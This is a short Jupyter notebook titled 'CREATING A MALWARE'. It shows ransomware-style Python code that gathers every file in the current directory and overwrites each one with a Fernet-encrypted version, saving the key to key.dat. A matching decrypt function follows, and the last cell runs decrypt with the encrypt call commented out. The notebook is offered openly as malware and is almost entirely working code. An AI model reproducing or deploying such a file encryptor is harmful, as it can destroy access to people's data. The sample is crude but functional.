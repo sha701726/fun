{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# CREATING A MALWARE"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "from cryptography.fernet import Fernet\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Append All The Files In A List Named As Files :"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PRINTNG THE FILES HERE:  ['bug_report.md', 'data.txt', 'log.txt', 'main.py']\n"
     ]
    }
   ],
   "source": [
    "files = []\n",
    "for file in os.listdir():\n",
    "    if file == \"encryption.ipynb\" or file == \"key.dat\" :\n",
    "        continue\n",
    "    if os.path.isfile(file):\n",
    "        files.append(file)\n",
    "\n",
    "print(\"PRINTNG THE FILES HERE: \",files)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Function To Encrypt The Files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "def encrypt(files) :\n",
    "    try :\n",
    "        key = Fernet.generate_key() # Generate An Encryption Key\n",
    "        with open(\"key.dat\",\"wb\") as n :\n",
    "            n.write(key) # Loading The Key In A File Named As \"key.dat\":\n",
    "        for file in files :\n",
    "            with open(file, \"rb\") as f :\n",
    "                contents = f.read()\n",
    "            contents_encrypted = Fernet(key).encrypt(contents)\n",
    "            with open(file, \"wb\") as g :\n",
    "                g.write(contents_encrypted)\n",
    "        print(\"Your Files have been encrypted\")\n",
    "    except Exception as e :\n",
    "        print(\"ERROR:  \",e)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Function To Decrypt The Files"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [],
   "source": [
    "def decrypt(files) :\n",
    "    try :\n",
    "        with open(\"key.dat\",\"rb\") as k :\n",
    "            keyv = k.read()\n",
    "        for file in files :\n",
    "            with open(file, \"rb\") as f :\n",
    "                contents = f.read()\n",
    "            contents_encrypted = Fernet(keyv).decrypt(contents)\n",
    "            with open(file, \"wb\") as g :\n",
    "                g.write(contents_encrypted)\n",
    "        print(\"Your Files have been decrypted\")\n",
    "    except Exception as e :\n",
    "        print(\"ERROR:  \",e)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Calling The Functions \"encrypt() and decrypt()\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Your Files have been decrypted\n"
     ]
    }
   ],
   "source": [
    "if __name__ == \"__main__\" :\n",
    "    # encrypt(files)\n",
    "    decrypt(files)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
